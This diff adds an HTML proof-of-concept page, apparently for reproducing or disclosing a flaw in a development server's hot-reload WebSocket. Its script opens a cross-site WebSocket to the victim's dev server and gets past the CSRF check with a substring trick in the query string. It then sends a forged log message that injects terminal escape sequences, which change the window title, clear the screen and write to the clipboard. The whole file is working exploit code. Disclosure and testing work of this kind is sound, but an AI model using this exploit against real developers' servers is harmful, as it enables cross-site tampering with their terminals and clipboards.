@@ -1,0 +1,41 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>attacker.test</title>
+<h1>Just an ordinary page</h1>
+<script>
+// Cross-site: opens the HMR WebSocket via the isInternalEndpoint substring
+// bypass (?x=/_next/image), then sends a forged 'browser-logs' message.
+// The server treats it exactly like a message from its own legitimate
+// dev-overlay client -- there is no per-connection authentication beyond the
+// (bypassed) upgrade-time CSRF check.
+window.state = 'connecting';
+
+const ESC = '\x1b';
+const injected =
+  ESC + ']0;PWNED-BY-CROSS-SITE-PAGE' + '\x07' +
+  ESC + '[2J' + ESC + '[H' +
+  '*** THIS LINE WAS INJECTED BY attacker.test VIA A FORGED HMR MESSAGE ***\n' +
+  ESC + ']52;c;' + btoa('pwned-clipboard-write-from-browser') + '\x07';
+
+const payload = {
+  event: 'browser-logs',
+  router: 'app',
+  sourceType: 'server',
+  entries: [
+    {
+      kind: 'console',
+      method: 'log',
+      consoleMethodStack: null,
+      args: [ { kind: 'arg', data: JSON.stringify(injected) } ],
+    },
+  ],
+};
+
+const ws = new WebSocket('ws://victimdev.test:3020/_next/hmr?x=/_next/image');
+ws.onopen = () => {
+  window.state = 'OPEN';
+  ws.send(JSON.stringify(payload));
+};
+ws.onerror = () => { window.state = 'ERROR'; };
+ws.onclose = () => { if (window.state === 'connecting') window.state = 'CLOSED'; };
+</script>
